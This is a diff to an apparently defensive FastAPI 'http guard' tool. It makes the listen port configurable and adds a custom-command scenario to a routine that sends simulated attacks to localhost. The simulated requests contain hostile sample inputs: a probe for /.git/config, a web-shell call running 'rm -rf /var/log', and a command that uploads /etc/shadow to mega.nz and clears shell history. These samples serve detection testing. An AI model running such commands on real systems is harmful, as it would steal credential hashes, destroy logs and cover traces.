@@ -57,6 +57,7 @@ def create_http_guard_app(config: Dict) -> FastAPI:
     brute_force_threshold = int(http_cfg.get("brute_force_threshold", 8))
     block_duration_minutes = int(http_cfg.get("block_duration_minutes", 60))
     fallback_on_error = bool(http_cfg.get("fallback_on_error", True))
+    listen_port = int(http_cfg.get("listen_port", 80))
 
     os.makedirs(os.path.dirname(threat_log_path), exist_ok=True)
 
@@ -162,22 +163,23 @@ def create_http_guard_app(config: Dict) -> FastAPI:
         
         async with httpx.AsyncClient() as client:
             headers = {}
+            base_url = f"http://127.0.0.1:{listen_port}"
             if scenario == "normal_user":
                 headers = {"x-mock-ip": "84.22.12.19"}
                 try:
-                    await client.get("http://127.0.0.1/normal_path", headers=headers)
+                    await client.get(f"{base_url}/normal_path", headers=headers)
                 except Exception:
                     pass
             elif scenario == "external_recon":
                 headers = {"x-mock-ip": "198.51.100.42"}
                 try:
-                    await client.get("http://127.0.0.1/.git/config", headers=headers)
+                    await client.get(f"{base_url}/.git/config", headers=headers)
                 except Exception:
                     pass
             elif scenario == "external_destructive":
                 headers = {"x-mock-ip": "203.0.113.111"}
                 try:
-                    await client.get("http://127.0.0.1/admin/shell?cmd=rm+-rf+/var/log", headers=headers)
+                    await client.get(f"{base_url}/admin/shell?cmd=rm+-rf+/var/log", headers=headers)
                 except Exception:
                     pass
             elif scenario == "insider_normal":
@@ -187,7 +189,7 @@ def create_http_guard_app(config: Dict) -> FastAPI:
                     "x-user-role": role
                 }
                 try:
-                    await client.post("http://127.0.0.1/normal_path", headers=headers)
+                    await client.post(f"{base_url}/normal_path", headers=headers)
                 except Exception:
                     pass
             elif scenario == "insider_recon":
@@ -197,7 +199,7 @@ def create_http_guard_app(config: Dict) -> FastAPI:
                     "x-user-role": role
                 }
                 try:
-                    await client.post("http://127.0.0.1/hr/employees.csv", headers=headers)
+                    await client.post(f"{base_url}/hr/employees.csv", headers=headers)
                 except Exception:
                     pass
             elif scenario == "insider_sabotage":
@@ -207,9 +209,22 @@ def create_http_guard_app(config: Dict) -> FastAPI:
                     "x-user-role": role
                 }
                 try:
-                    await client.post("http://127.0.0.1/etc/shadow", headers=headers, json={
+                    await client.post(f"{base_url}/etc/shadow", headers=headers, json={
                         "command": "curl -F file=@/etc/shadow mega.nz/upload; history -c",
                         "cloud_upload": True
+                    })
+                except Exception:
+                    pass
+            elif scenario == "custom_command":
+                cmd = payload.get("command", "")
+                headers = {
+                    "x-mock-ip": "192.168.1.75",
+                    "x-user-id": user_id,
+                    "x-user-role": role
+                }
+                try:
+                    await client.post(f"{base_url}/custom_insider_command", headers=headers, json={
+                        "command": cmd
                     })
                 except Exception:
                     pass
